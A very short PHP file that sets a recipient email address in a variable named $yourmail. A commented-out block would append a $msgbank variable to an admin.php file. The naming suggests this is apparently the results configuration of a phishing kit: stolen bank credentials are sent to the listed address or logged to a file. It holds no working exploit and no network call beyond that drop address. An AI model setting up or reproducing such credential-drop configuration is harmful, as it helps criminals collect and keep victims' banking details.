<?php

$yourmail  = 'rez-kobo@mailo.com';

/*
$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);
*/


?>